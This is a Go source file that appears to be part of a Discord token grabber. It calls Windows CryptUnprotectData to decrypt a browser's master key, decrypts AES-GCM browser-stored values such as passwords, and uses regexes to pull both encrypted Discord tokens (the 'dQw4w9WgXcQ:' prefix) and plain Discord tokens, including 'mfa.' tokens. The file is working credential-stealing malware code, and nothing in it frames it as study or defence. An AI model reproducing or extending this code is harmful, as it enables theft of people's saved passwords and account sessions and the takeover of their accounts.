package scripts

import (
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"encoding/json"
	"os"
	"regexp"
	"strings"
	"syscall"
	"unsafe"
)

type JsonCryptFile struct {
	Storage WINCRYPT `json:"os_crypt"`
}

type WINCRYPT struct {
	EncryptedKey string `json:"encrypted_key"`
}

type DATA_BLOB struct {
	cbData uint32
	pbData *byte
}

var (
	dllCrypt32  = syscall.NewLazyDLL("Crypt32.dll")
	dllKernel32 = syscall.NewLazyDLL("Kernel32.dll")

	procDecryptData = dllCrypt32.NewProc("CryptUnprotectData")
	procLocalFree   = dllKernel32.NewProc("LocalFree")
)

func NewBlob(d []byte) *DATA_BLOB {

	if len(d) == 0 {
		return &DATA_BLOB{}
	}

	return &DATA_BLOB{
		pbData: &d[0],
		cbData: uint32(len(d)),
	}

}

func (b *DATA_BLOB) ToByteArray() []byte {

	d := make([]byte, b.cbData)
	copy(d, (*[1 << 30]byte)(unsafe.Pointer(b.pbData))[:])

	return d

}

func DecryptBytes(data []byte) ([]byte, error) {

	var outblob DATA_BLOB

	rPointer, _, err := procDecryptData.Call(
		uintptr(unsafe.Pointer(NewBlob(data))), 0, 0, 0, 0, 0,
		uintptr(unsafe.Pointer(&outblob)),
	)
	if rPointer == 0 {
		return nil, err
	}

	defer procLocalFree.Call(uintptr(unsafe.Pointer(outblob.pbData)))

	return outblob.ToByteArray(), nil

}

func GetMasterKey(location string) ([]byte, error) {

	byteValue, err := os.ReadFile(location)
	if err != nil {
		return nil, err
	}

	var fileContent JsonCryptFile
	err = json.Unmarshal(byteValue, &fileContent)
	if err != nil {
		return nil, err
	}

	baseEncryptedKey := fileContent.Storage.EncryptedKey
	encryptedKey, err := base64.StdEncoding.DecodeString(baseEncryptedKey)
	if err != nil {
		return nil, err
	}
	encryptedKey = encryptedKey[5:]

	key, err := DecryptBytes(encryptedKey)
	if err != nil {
		return nil, nil
	}

	return key, nil
}

func DecryptBrowserValue(passwordEncrypt string, masterKey []byte) string {

	ciphertext := []byte(passwordEncrypt)

	c, err := aes.NewCipher(masterKey)

	if err != nil {
		return ""
	}
	gcm, err := cipher.NewGCM(c)

	if err != nil {
		return ""
	}
	nSize := gcm.NonceSize()

	if len(ciphertext) < nSize {
		return ""
	}

	ns, ciphertext := ciphertext[:nSize], ciphertext[nSize:]
	content, err := gcm.Open(nil, ns, ciphertext, nil)

	if err != nil {
		return ""
	}

	return string(content)

}

func DecryptToken(buffer []byte, location string) string {
	iv := buffer[3:15]
	payload := buffer[15:]

	key, err := GetMasterKey(location)

	if err != nil {
		return ""
	}

	block, err := aes.NewCipher(key)
	if err != nil {
		return ""
	}

	aesGCM, err := cipher.NewGCM(block)
	if err != nil {
		return ""
	}

	ivSize := len(iv)
	if len(payload) < ivSize {
		return ""
	}

	plaintext, err := aesGCM.Open(nil, iv, payload, nil)
	if err != nil {
		return ""
	}

	return string(plaintext)
}

func GetEncryptedToken(line []byte, location string, tokenList *[]string) {
	var tokenRegex = regexp.MustCompile("dQw4w9WgXcQ:[^\"]*")

	for _, match := range tokenRegex.FindAll(line, -1) {
		baseToken := strings.SplitAfterN(string(match), "dQw4w9WgXcQ:", 2)[1]
		encryptedToken, err := base64.StdEncoding.DecodeString(baseToken)
		if err != nil {
			continue
		}

		token := DecryptToken(encryptedToken, location)
		if token != "" {
			*tokenList = append(*tokenList, token)
		}
	}
}

func GetDecryptedToken(line []byte, tokenList *[]string) {
	var tokenRegex = regexp.MustCompile(`[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}`)

	for _, match := range tokenRegex.FindAll(line, -1) {
		token := string(match)
		*tokenList = append(*tokenList, token)
	}
}
